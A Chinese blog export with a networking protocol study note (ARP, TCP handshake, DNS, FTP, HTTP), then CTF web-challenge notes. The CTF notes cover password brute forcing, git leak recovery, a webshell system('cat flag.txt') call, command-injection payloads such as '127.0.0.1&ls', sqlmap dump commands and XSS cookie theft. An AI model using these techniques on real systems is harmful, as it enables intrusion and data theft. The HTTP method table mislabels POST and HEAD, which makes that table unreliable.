title="MAC与IP间的协议"></a>MAC与IP间的协议</h2><p><strong>ARP协议：</strong> 负责将IP地址映射到 MAC地址</p><ul><li><input checked="" disabled="" type="checkbox"> 根据IP地址获取物理地址:<br>首先，每个主机都会在自己的ARP缓冲区中建立一个ARP列表，以表示IP地址和MAC地址之间的对应关系。当源主机要发送数据时，首先检查ARP列表中是否有对应IP地址的目的主机的MAC地址，如果有，则直接发送数据，如果没有，就向本网段的所有主机发送ARP数据包，该数据包包括的内容有：源主机 IP地址，源主机MAC地址，目的主机的IP 地址。当本网络的所有主机收到该ARP数据包时，首先检查数据包中的IP地址是否是自己的IP地址，如果不是，则忽略该数据包，如果是，则首先从数据包中取出源主机的IP和MAC地址写入到ARP列表中，如果已经存在，则覆盖，然后将自己的MAC地址写入ARP响应包中，告诉源主机自己是它想要找的MAC地址。源主机收到ARP响应包后。将目的主机的IP和MAC地址写入ARP列表，并利用此信息发送数据。如果源主机一直没有收到ARP响应数据包，表示ARP查询失败。<br>注意：广播（255.255.255.255）发送ARP请求，单播发送ARP响应</li></ul><hr><p>MAC地址：MAC地址也叫物理地址、硬件地址，由网络设备制造商生产时烧录在网卡(Network lnterface Card)的EPROM(一种闪存芯片，通常可以通过程序擦写)。IP地址与MAC地址在计算机里都是以二进制表示的，IP地址是32位的，而MAC地址则是48位的。MAC地址的长度为48位(6个字节)，通常表示为12个16进制数，如：00-16-EA-AE-3C-40就是一个MAC地址，其中前3个字节，16进制数00-16-EA代表网络硬件制造商的编号，它由IEEE(电气与电子工程师协会)分配，而后3个字节，16进制数AE-3C-40代表该制造商所制造的某个网络产品(如网卡)的系列号。只要不更改自己的MAC地址，MAC地址在世界是唯一的。形象地说，MAC地址就如同身份证上的身份证号码，具有唯一性。<br><em>震网病毒攻击了西门子泄露MAC的PLC</em></p><hr><hr><h2 id="网络之间信息传送的协议（网际层）"><a href="#网络之间信息传送的协议（网际层）" class="headerlink" title="网络之间信息传送的协议（网际层）"></a>网络之间信息传送的协议（网际层）</h2><p><strong>IP协议：</strong> 将IP信息包从源设备(如用户的计算机)传到目的设备(如某部门的www服务器)</p><ul><li><input checked="" disabled="" type="checkbox"> 为了达到这样的目的，IP必须依赖<strong>IP地址</strong>与<strong>IP路由器</strong>两种机制来实现。<br>IP地址<br>IP规定网络上所有的设备都必须有一个独一无二的IP地址，就好比是邮件上都必须注明收件人地址，邮递员才能将邮件送到。同理，每个IP信息包都必须包含有目的设备的IP地址，信息包才可以正确地送到目的地。同一设备不可以拥有多个IP地址，所有使用IP的网络设备至少有一个唯一的IP地址。<br>IP路由<br>互联网是由许多个网络连接所形成的大型网络。如果要在互联网中传送IP信息包，除了确保网络上每个设备都有一个唯一的IP地址之外，网络之间还必须有传送的机制，才能将IP信息包通过一个个的网络传送到目的地。此种传送机制称为IP路由。<br>各个网络通过路由器相互连接。路由器的功能是为IP信息包选择传送的路径。换言之，必须依靠沿途各路由器的通力合作，才能将IP信息包送到目的地。在IP路由的过程中，由路由器负责选择路径，IP信息包则是被传送的对象。<img src="https://img-blog.csdnimg.cn/2020120319503470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></li></ul><hr><p>IP地址与IP路由是IP信息包传送的基础。此外，IP信息包传送时还有一项很重要的特性，即使用非连接式的传送方式。非连接式的传送方式是指IP信息包传送时，源设备与目的设备双方不必事先连接，即可将IP信息包送达。即源设备完全不用理会目的设备，而只是单纯地将IP信息包逐一送出。至于目的设备是否收到每个信息包、是否收到正确的信息包等，则由上层的协议(例如TCP)来负责检查。</p><hr><p>子网掩码：用来指明一个IP地址的哪些位标识的是主机所在的子网，以及哪些位标识的是主机的位掩码。子网掩码不能单独存在，它必须结合IP地址一起使用。子网掩码只有一个作用，就是将某个IP地址划分成网络地址和主机地址两部分。用于屏蔽IP地址的一部分以区别网络标识和主机标识，并说明该IP地址是在局域网上，还是在广域网上。</p><hr><h2 id="网络之间信息传送的协议（传输层）"><a href="#网络之间信息传送的协议（传输层）" class="headerlink" title="网络之间信息传送的协议（传输层）"></a>网络之间信息传送的协议（传输层）</h2><p><strong>①TCP协议：</strong> 为不可靠的互联网络上提供可靠的端到端字节流</p><ul><li><p><input checked="" disabled="" type="checkbox">  应用层向TCP层发送用于网间传输的、用8位字节表示的数据流，然后TCP把数据流分区成适当长度的报文段（通常受该计算机连接的网络的数据链路层的最大传输单元（MTU）的限制）。之后TCP把结果包传给IP层，由它来通过网络将包传送给接收端实体的TCP层。TCP为了保证不发生丢包，就给每个包一个序号，同时序号也保证了传送到接收端实体的包的按序接收。然后接收端实体对已成功收到的包发回一个相应的确认（ACK）；如果发送端实体在合理的往返时延（RTT）内未收到确认，那么对应的数据包就被假设为已丢失将会被进行重传。TCP用一个校验和函数来检验数据是否有错误；在发送和接收时都要计算校验和。每台支持TCP的机器都有一个TCP传输实体。TCP实体可以是一个库过程、一个用户进程，或者内核的一部分。在所有这些情形下，它管理TCP流，以及与IP层之间的接口。TCP传输实体接受本地进程的用户数据流，将它们分割成不超过64KB（实际上去掉IP和TCP头，通常不超过1460数据字节）的分段，每个分段以单独的IP数据报形式发送。当包含TCP数据的数据报到达一台机器时，它们被递交给TCP传输实体，TCP传输实体重构出原始的字节流。为简化起见，我们有时候仅仅用“TCP”来代表TCP传输实体（一段软件）或者TCP协议（一组规则）。例如，在“用户将数据交给TCP”这句话中，很显然这里指的是TCP传输实体。IP层并不保证数据报一定被正确地递交到接收方，也不指示数据报的发送速度有多快。正是TCP负责既要足够快地发送数据报，以便使用网络容量，但又不能引起网络拥塞：而且，TCP超时后，要重传没有递交的数据报。即使被正确递交的数据报，也可能存在错序的问题，这也是TCP的责任，它必须把接收到的数据报重新装配成正确的顺序。</p></li><li><p><strong>TCP</strong></p></li></ul><p>建立方式——三次握手：<br>第一次握手：客户端发送syn包(seq=x)到服务器，并进入SYN_SEND(发送)状态，等待服务器确认；<br>第二次握手：服务器收到syn包，必须确认客户的SYN（ack=x+1），同时自己也发送一个SYN包（seq=y），即SYN+ACK包，此时服务器进入SYN_RECV（接收）状态；<br>第三次握手：客户端收到服务器的SYN＋ACK包，向服务器发送确认包ACK(ack=y+1)，此包发送完毕，客户端和服务器进入ESTABLISHED（已建立）状态，完成三次握手。</p><p><img src="https://img-blog.csdnimg.cn/20201203221946406.gif"></p><p>连接终止——四次挥手：<br>第一次挥手：主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送，也就是主动关闭方告诉被动关闭方：我已经不 会再给你发数据了(当然，在fin包之前发送出去的数据，如果没有收到对应的ack确认报文，主动关闭方依然会重发这些数据)，但是，此时主动关闭方还可以接受数据。<br>第二次挥手：被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1。<br>第三次挥手：被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发数据了。<br>第四次挥手：主动关闭方收到FIN后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成四次挥手。</p><p>说明：<br>1）SYN和ACK是标志位（0/1）（ACK=1表明ack有效），seq是序列号，ack是确认号。<br>2）给对方的确认方式就是把对方传来的seq+1并赋给ack。<br>3）SYN攻击 用众多伪造ip地址向服务器发送SYN=1（请求连接），让服务器处于SYN-RCVD状态，但都无法第三次握手（因为伪造ip不存在）<br>4）4次挥手中的FIN就相当于三次握手中的SYN。<br>5）序号seq，确认序号ack，确认标志位ACK作用还是一样的，就是确认作用（把seq加上1赋给ack，并把ACK置1）<br>6）为什么一个3次1个4次不一样？<br>因为两端的数据并不是同时发送完，所以两端谁发送完数据都需要自己告诉对方一次，并且对方确认一次。</p><p><img src="https://img-blog.csdnimg.cn/20201203210440531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><hr><p>互联网络与单个网络有很大的不同，因为互联网络的不同部分可能有截然不同的拓扑结构、带宽、延迟、数据包大小和其他参数。TCP的设计目标是能够动态地适应互联网络的这些特性，而且具备面对各种故障时的健壮性。不同主机的应用层之间经常需要可靠的、像管道一样的连接，但是IP层不提供这样的流机制，而是提供不可靠的包交换。简而言之，TCP必须提供可靠性的良好性能，这正是大多数用户所期望的而IP又没有提供的功能。</p><hr><p><strong>②UDP协议：</strong> 为应用程序提供了无需建立连接就可以发送封装的 IP 数据包的方法</p><ul><li><input checked="" disabled="" type="checkbox"> 对应用程序交下来的报文，在添加首部后就向下交付给IP层。既不拆分，也不合并，而是保留这些报文的边界</li></ul><table><thead><tr><th align="left"></th><th align="center">UDP</th><th align="center">TCP</th></tr></thead><tbody><tr><td align="left">是否连接</td><td align="center">无连接</td><td align="center">面向连接</td></tr><tr><td align="left">是否可靠</td><td align="center">不可靠传输，不使用流量控制和拥塞控制</td><td align="center">可靠传输，使用流量控制和拥塞控制</td></tr><tr><td align="left">连接对象个数</td><td align="center">支持一对一，一对多，多对一和多对多的交互通信</td><td align="center">只能一对一通信</td></tr><tr><td align="left">传输方式</td><td align="center">面向报文</td><td align="center">面向字节流</td></tr><tr><td align="left">首部字节</td><td align="center">8字节</td><td align="center">最小20，最大60字节</td></tr><tr><td align="left">应用环境</td><td align="center">适用于实时通信（IP电话、视频会议、直播等）</td><td align="center">适用于要求可靠传输的应用（文件传输）</td></tr><tr><td align="left">下层协议</td><td align="center">TFTP、SNMP、NFS、DNS、BOOTP</td><td align="center">FTP、Telnet、SMTP、POP3、HTTP</td></tr></tbody></table><ul><li>TCP向上层提供面向连接的可靠服务 ，UDP向上层提供无连接不可靠服务。</li><li> 虽然 UDP 并没有 TCP 传输来的准确，但是也能在很多实时性要求高的地方有所作为</li><li> 对数据准确性要求高，速度可以相对较慢的，可以选用TCP。不产生任何额外的数据，即使知道有破坏的包也不进行重发。当强调传输性能而不是传输的完整性时，如：音频和多媒体应用，UDP是最好的选择。在数据传输时间很短，以至于此前的连接过程成为整个流量主体的情况下，UDP也是一个好的选择。</li></ul><h2 id="域名与IP间的协议"><a href="#域名与IP间的协议" class="headerlink" title="域名与IP间的协议"></a>域名与IP间的协议</h2><p><strong>DNS协议：</strong> 提供域名和IP地址相互映射的一个分布式数据库</p><ul><li><input checked="" disabled="" type="checkbox"> <strong>域名解析：</strong> 首先，根据域名系统域名空间的层次结构将其按子树划分为不同的区域，每个区域可看作是负责层次结构中这一部分节点的可管理的权力实体。例如，整个域的顶层区域由ICANN负责管理，一些国家域名及其下属的那些节点又构成了各自的区域，像.cn域就由CNNIC负责管理。而.cn域下又被划分为一些更小的区域，例如.fudan.edu.cn由复旦大学网络中心负责管理。其次，每个区域必须有对应的域名服务器，每个区域中包含的信息存储在域名服务器上。一个区域中可有两个或多个域名服务器，这样即使其中一个域名服务器出了故障，另一个域名服务器仍然可以正常提供信息。一个域名服务器也可以同时管辖多个区域。域名服务器在接到用户发出的请求后查询自身的资源记录集合，返回用户想要得到的最终答案，或者当自身的资源记录集合中查不到所需要的答案时，返回指向另外一个域名服务器的指针，用户将继续向那个域名服务器发出请求。所以说，域名服务器不需要记录所有下属域名和主机的信息，对于其中的子域(如果存在)，只需要知道子域的域名服务器即可。资源记录是一个域名到值的绑定，它包括以下字段：域名、值、类型、分类和生命期。域名字段和值字段分别用来表示解析的内容和解析返回的结果。类型字段代表了值的种类：类型为A代表值字段是一个IP地址，即用户所要的最终答案；类型为NS代表值字段是另一个域名服务器的域名，该域名服务器能够知道如何解析域名字段所指定的域名；类型为CNAME代表值字段是由域名所指定的主机的一个别名；类型为MX代表值字段是一个邮件服务器的域名，该邮件服务器接收由域名字段所指定的域的邮件；类型PTR用于域名反解等。分类字段允许指定其他的记录类型。生命期字段用于指出该资源记录的有效期是多少。为减少域名解析时间，域名服务器会缓存一些曾经查询过的、来自其他域名服务器的资源记录。由于这些资源记录会因为更改而失效，因此域名服务器设置了生命期，到期的资源记录会被清除出缓存。<br>根域名服务器知道所有顶级域名的域名服务器，对应于每个顶级域名，它都有两条资源记录：一条是NS资源记录，域名字段是该顶级域名，值字段是该顶级域名解析的域名服务器的域名；另一条是A资源记录，用来指明该域名服务器的域名对应的IP地址。综合使用这两条记录，就可以知道对该域下的某个域名解析，应该继续去哪个IP地址的域名服务器寻找。第二层的域名服务器类似地存放各个第三层域名服务器的指针。第三层的域名服务器会出现A、CNAME、MX等类型的资源记录。每个域名服务器都有根域名服务器的地址记录。最后，一个需要域名解析的用户先将该解析请求发往本地的域名服务器。如果本地的域名服务器能够解析，则直接得到结果，否则本地的域名服务器将向根域名服务器发送请求。依据根域名服务器返回的指针再查询下一层的域名服务器，依此类推，最后得到所要解析域名的IP地址。</li></ul><p><strong>域名反解：</strong> 是指给出一个IP地址，找出其对应的域名，这也是利用DNS来实现的。举个例子，假设一个要反解的IP地址为202.120.225.9，系统将其改写为9.225.120.202. in-addr.arpa，然后按域名解析的方式查询。这需要在被查询主机的本地域名服务器上有一条对应于9.225.120.202.in-addr.arpa的资源记录，类型是PTR，值是其域名。</p><p><del>（域名系统的名字空间）</del></p><hr><p>在浏览器中输入<a href="http://www.baidu.com后执行的全部过程/">www.baidu.com后执行的全部过程</a> ：<br>1、客户端浏览器通过DNS解析到<a href="http://www.baidu.com的ip地址220.181.27.48,通过这个ip地址找到客户端到服务器的路径.客户端浏览器发起一个http会话到220.161.27.48,然后通过tcp进行封装数据包,输入到网络层./">www.baidu.com的IP地址220.181.27.48，通过这个IP地址找到客户端到服务器的路径。客户端浏览器发起一个HTTP会话到220.161.27.48，然后通过TCP进行封装数据包，输入到网络层。</a><br>  2、在客户端的传输层(添加TCP头)，把HTTP会话请求分成报文段，添加源和目的端口，如服务器使用80端口监听客户端的请求，客户端由系统随机选择一个端口如5000，与服务器进行交换，服务器把相应的请求返回给客户端的5000端口。然后使用IP层的IP地址查找目的端。<br>  3、客户端的网络层（添加IP头）不用关系应用层或者传输层的东西，主要做的是通过查找路由表确定如何到达服务器，期间可能经过多个路由器，这些都是由路由器来完成的工作，我不作过多的描述，无非就是通过查找路由表决定通过那个路径到达服务器。<br>  4、客户端的链路层（添加MAC头），包通过链路层发送到路由器，通过邻居协议查找给定IP地址的MAC地址，然后发送ARP请求查找目的地址，如果得到回应后就可以使用ARP的请求应答交换的IP数据包现在就可以传输了，然后发送IP数据包到达服务器的地址。</p><hr><h2 id="传输文件的协议"><a href="#传输文件的协议" class="headerlink" title="传输文件的协议"></a>传输文件的协议</h2><p>  <strong>FTP协议：</strong> 将文件从一台计算机传送到另一台计算机</p><ul><li><input checked="" disabled="" type="checkbox"> FTP支持两种模式，一种方式叫做Standard (也就是 PORT方式，主动方式)，一种是 Passive(也就是PASV，被动方式)。 Standard模式 FTP的客户端发送 PORT 命令到FTP Serve。Passive模式FTP的客户端发送 PASV命令到 FTP Server。<br>Port：<br>FTP 客户端首先和FTP服务器的TCP 21端口建立连接，通过这个通道发送命令，客户端需要接收数据的时候在这个通道上发送PORT命令。 PORT命令包含了客户端用什么端口接收数据。在传送数据的时候，服务器端通过自己的TCP 20端口连接至客户端的指定端口发送数据。 FTP server必须和客户端建立一个新的连接用来传送数据。<br>Passive：<br>在建立控制通道的时候和Standard模式类似，但建立连接后发送的不是Port命令，而是Pasv命令。FTP服务器收到Pasv命令后，随机打开一个高端端口（端口号大于1024）并且通知客户端在这个端口上传送数据的请求，客户端连接FTP服务器此端口，通过三次握手建立通道，然后FTP服务器将通过这个端口进行数据的传送。<br>很多防火墙在设置的时候都是不允许接受外部发起的连接的，所以许多位于防火墙后或内网的FTP服务器不支持PASV模式，因为客户端无法穿过防火墙打开FTP服务器的高端端口；而许多内网的客户端不能用PORT模式登陆FTP服务器，因为从服务器的TCP 20无法和内部网络的客户端建立一个新的连接，造成无法工作。</li></ul><hr><p>默认情况下FTP协议使用TCP端口中的 20和21这两个端口，其中20用于传输数据，21用于传输控制信息。但是，是否使用20作为传输数据的端口与FTP使用的传输模式有关，如果采用主动模式，那么数据传输端口就是20；如果采用被动模式，则具体最终使用哪个端口要服务器端和客户端协商决定。</p><hr><h2 id="客户端和服务器端请求和应答的标准协议"><a href="#客户端和服务器端请求和应答的标准协议" class="headerlink" title="客户端和服务器端请求和应答的标准协议"></a>客户端和服务器端请求和应答的标准协议</h2><p><strong>HTTP协议：</strong> 客户端和服务端标准通信格式</p><ul><li><input checked="" disabled="" type="checkbox"> 一个客户机与服务器建立连接后，发送一个请求给服务器，请求方式的格式为，统一资源标识符、协议版本号，后边是MIME信息包括请求修饰符、客户机信息和可能的内容。服务器接到请求后，给予相应的响应信息，其格式为一个状态行包括信息的协议版本号、一个成功或错误的代码，后边是MIME信息包括服务器信息、实体信息和可能的内容。其实简单说就是任何服务器除了包括HTML文件以外，还有一个HTTP驻留程序，用于响应用户请求。你的浏览器是HTTP客户，向服务器发送请求，当浏览器中输入了一个开始文件或点击了一个超级链接时，浏览器就向服务器发送了HTTP请求，此请求被送往由IP地址指定的URL。驻留程序接收到请求，在进行必要的操作后回送所要求的文件。在这一过程中，在网络上发送和接收的数据已经被分成一个或多个数据包（packet），每个数据包包括：要传送的数据；控制信息，即告诉网络怎样处理数据包。TCP/IP决定了每个数据包的格式。如果事先不告诉你，你可能不会知道信息被分成用于传输和再重新组合起来的许多小块。许多HTTP通讯是由一个用户代理初始化的并且包括一个申请在源服务器上资源的请求。最简单的情况可能是在用户代理(UA)和源服务器(O)之间通过一个单独的连接来完成。当一个或多个中介出现在请求/响应链中时，情况就变得复杂一些。中介有三种：代理(Proxy)、网关(Gateway)和通道(Tunnel)。一个代理根据URI的绝对格式来接受请求，重写全部或部分消息，通过URI的标识把已格式化过的请求发送到服务器。网关是一个接收代理，作为一些其它服务器的上层，并且如果必须的话，可以把请求翻译给下层的服务器协议。一个通道作为不改变消息的两个连接之间的中继点。当通讯需要通过一个中介(例如：防火墙等)或者是中介不能识别消息的内容时，通道经常被使用。</li></ul><hr><p>客户与服务器之间的HTTP连接是一种一次性连接，它限制每次连接只处理一个请求，当服务器返回本次请求的应答后便立即关闭连接，下次请求再重新建立连接。这种一次性连接主要考虑到WWW服务器面向的是Internet中成干上万个用户，且只能提供有限个连接，故服务器不会让一个连接处于等待状态，及时地释放连接可以大大提高服务器的执行效率。 [7]<br>HTTP是一种无状态协议，即服务器不保留与客户交易时的任何状态。这就大大减轻了服务器记忆负担，从而保持较快的响应速度。HTTP是一种面向对象的协议。允许传送任意类型的数据对象。它通过数据类型和长度来标识所传送的数据内容和大小，并允许对数据进行压缩传送。当用户在一个HTML文档中定义了一个超文本链后，浏览器将通过TCP/IP协议与指定的服务器建立连接。</p><hr><table><thead><tr><th>HTTP方法</th><th>作用描述</th></tr></thead><tbody><tr><td>GET</td><td>客户端请求指定资源信息，服务器返回指定资源</td></tr><tr><td>POST</td><td>只请求响应报文中的HTTP首部</td></tr><tr><td>HEAD</td><td>将客户端的数据提交到服务器，例：注册表单</td></tr><tr><td>PUT</td><td>从客户端向服务器传送的数据取代指定的文档内容</td></tr><tr><td>DELETE</td><td>请求服务器删除Request-URI所标识的资源</td></tr><tr><td>MOVE</td><td>请求服务器将制定的页面移至另一个网络地址</td></tr></tbody></table><p>HTTP状态码<br>所有HTTP响应的第一行都是状态行，依次是当前HTTP版本号，3位数字组成的状态代码，以及描述状态的短语，彼此由空格分隔。状态代码的第一个数字代表当前响应的类型：</p><ul><li>1xx消息——请求已被服务器接收，继续处理</li><li>2xx成功——请求已成功被服务器接收、理解、并接受</li><li>3xx重定向——需要后续操作才能完成这一请求</li><li>4xx请求错误——请求含有词法错误或者无法被执行</li><li>5xx服务器错误——服务器在处理某个正确请求时发生错误</li></ul>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf-web</title>
    <link href="/2020/11/24/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/11/24/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="基础认证题"><a href="#基础认证题" class="headerlink" title="基础认证题"></a>基础认证题</h2><p><img src="https://img-blog.csdnimg.cn/20201123215812631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>页面中依据提示 可猜测用户为admin<br>可弱口令尝试（admin）——失败<br>暴脾气，，，词典爆破！<br>下载其页面提供的词典<br>抓包处对上图circle处进行解密 在burp的decode模板中进行查询可知其加密方式为base64<br>载入词典<br>此处开始走弯路：1.词典所加载的均为密码，缺少用户名（发现问题后，度娘学习正则表达式，很好，又学了个奇奇怪怪的姿势）2.词典爆破后一直都是401返回，长度均为404，没有出现200返回（原因未明）<br>——————————————我是分割线———————————<br>折腾一段时间后（替换爆破点，加载词典，设置解密方式），成功爆破出长度为200</p><h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p>要用到工具Githack,虚拟机一找，没有，网上查找Githack安装，？？？没有输入法吗，掉进一个大坑……配置源，使用sudo，dpkg命令……暂时做不下去了<br><img src="https://img-blog.csdnimg.cn/20201124083620314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h2><p>搜素引擎爬取各个网站时，网站告知搜索引擎的爬取范围（设置爬取权限）,robots.txt就作为搜素引擎爬取网站时第一个需要查看的文件</p><h2 id="灰色按钮（disabled-button）"><a href="#灰色按钮（disabled-button）" class="headerlink" title="灰色按钮（disabled button）"></a>灰色按钮（disabled button）</h2><p>利用开发者工具查看源代码，直接修改按钮对应的代码处（删除或注释掉带有禁用按钮的代码）涉及到html和php的学�</p><h2 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h2><p>服务器可以利用Cookies包含信息的任意性来筛选并经常性维护这些信息，以判断在HTTP传输中的状态。Cookies最典型的应用是判定注册用户是否已经登录网站，用户可能会得到提示，是否在下一次进入此网站时保留用户信息以便简化登录手续，这些都是Cookies的功用。另一个重要应用场合是“购物车”之类处理。用户可能会在一段时间内在同一家网站的不同页面中选择不同的商品，这些信息都会写入Cookies，以便在最后付款时提取信息。</p><h2 id="HTTP中的GET和POST传参"><a href="#HTTP中的GET和POST传参" class="headerlink" title="HTTP中的GET和POST传参"></a>HTTP中的GET和POST传参</h2><p>GET传参在URL地址栏直接后面跟 <strong>/?参数名+数值</strong><br>如 /?a=1 传参a=1<br>POST传参不能直接在URL栏里输入，使用插件hackbar，可以进行post传参</p><hr><p>post传参有四种方式，基本样式如下：</p><p>POST <a href="http://www.example.com/">http://www.example.com</a> HTTP/1.1<br>Content-Type: application/x-www-form-urlencoded;charset=utf-8<br>title=test&amp;sub%5B%5D=1&amp;sub%5B%5D=2&amp;sub%5B%5D=3</p><hr><h2 id="IP伪造-xff和referer"><a href="#IP伪造-xff和referer" class="headerlink" title="IP伪造-xff和referer"></a>IP伪造-xff和referer</h2><p>抓包后改包：<br>添加 X-Forwarded-For：ip Referer：网站<br>ip和网站均是要伪造的对象</p><p>X-Forwarded-For是用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的来源IP追加在X-Forwarded-For中，X-Real-IP，一般只记录真实发出请求的客户端IP</p><h2 id="curl-–local-port-xx"><a href="#curl-–local-port-xx" class="headerlink" title="curl –local-port xx"></a>curl –local-port xx</h2><p><a href="http://web.jarvisoj.com:32770/">http://web.jarvisoj.com:32770/</a></p><h3 id="Please-use-port-51-to-visit-this-site"><a href="#Please-use-port-51-to-visit-this-site" class="headerlink" title="Please use port 51 to visit this site."></a>Please use port 51 to visit this site.</h3><p>curl –local-port 51 <a href="http://web.jarvisoj.com:32770/">http://web.jarvisoj.com:32770/</a></p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>使用蚁剑或post方式 使用shell=system(‘cat flag.txt’)</p><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p>由于输入对管道符 | || &amp; &amp;&amp;过滤不严产生的漏洞<br>windows或linux下:</p><table><thead><tr><th align="center">格式</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">command1 &amp;&amp; command2</td><td align="center">先执行command1，如果为真，再执行command2</td></tr><tr><td align="center">command1| command2</td><td align="center">只执行command2</td></tr><tr><td align="center">command1 &amp; command2</td><td align="center">先执行command2后执行command1</td></tr><tr><td align="center">command1|| command2</td><td align="center">先执行command1，如果为假，再执行command2</td></tr></tbody></table><h2 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h2><p>Windows下githack下载不出现./../.git<br>只下载了50x和index （原因不明！）–补充：使用了旧版本的Githuack<br><img src="https://img-blog.csdnimg.cn/20210120134909178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">kali内利用githack 却未发现50x和index</p><hr><blockquote><p>git log #查看提交历史</p></blockquote><p><strong>方法一：</strong><br>在目标文件夹终端直接git show出答案</p><blockquote><p>git show：显示一个或多个对象(<code>blobs</code>，树，标签和提交)。对于提交，它还能<strong>显示日志消息和文本差异。</strong></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210120134849174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><strong>方法二：</strong><br>也可以使用git reset –hard “add flag的那个序列号”回退存有flag的版本</p><blockquote><p>git reset 序列号：回退版本</p></blockquote><p>此时文件夹内出现50x和index以及一个flag的txt<br><img src="https://img-blog.csdnimg.cn/20210121000823424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><blockquote><p>dvcs-ripper 参数:</p><p>-c perform ‘hg revert’ on end (default)<br>-b &lt;s&gt; Use branch &lt;s&gt; (default: )<br>-a &lt;s&gt; Use agent &lt;s&gt; (default: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:10.0.2) Gecko/20100101 Firefox/10.0.2)<br>-s do not verify SSL cert<br>-p &lt;h&gt; use proxy <h> for connections<br>-v verbose (-vv will be more verbose)</p></blockquote><h2 id="svn泄露"><a href="#svn泄露" class="headerlink" title="svn泄露"></a>svn泄露</h2><p><img src="https://img-blog.csdnimg.cn/20210311104348703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="hg泄露"><a href="#hg泄露" class="headerlink" title="hg泄露"></a>hg泄露</h2><p><img src="https://img-blog.csdnimg.cn/20210311104126693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>原文件不存在，直接在url得到<img src="https://img-blog.csdnimg.cn/20210311104220836.png"></p><hr><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>使用sqlmap<br>整数型以及字符型：<br><code>python3 sqlmap.py -u &quot;url&quot; --cookie=&quot;&quot; </code>（Ⅰ）<br>（Ⅰ）跟参数–current-db<br>（Ⅰ）跟参数-D 数据库名 –tables<br>（Ⅰ）跟参数-D 数据库名 -T 表名 –columns<br>（Ⅰ）跟参数-D 数据库名 -T 表名 (-Ｃ 列名) –dump</p><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p><code>127.0.0.1&amp;ls</code><br>出来一个<code>*.php</code><br>此时拼接<code>cat *.php</code>无回显（<a href="https://xz.aliyun.com/t/8125">传送门</a>）<br>此处是字符编码的问题 后面跟<code>| base64</code>出现一堆字符后复制解码即可</p><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>在xss平台上注册账号 建立一个项目（勾选默认配置即可）<br>复制xss代码<br><img src="https://img-blog.csdnimg.cn/20210218112452696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"> 先在第一栏随便输入字符<br>然后复制url到第二栏 并且更改刚刚的字符 替换拼接为xss代码<br>发送至服务器即可<br><img src="https://img-blog.csdnimg.cn/20210218112842968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">在项目里边可以看到反弹回来的内容<br><img 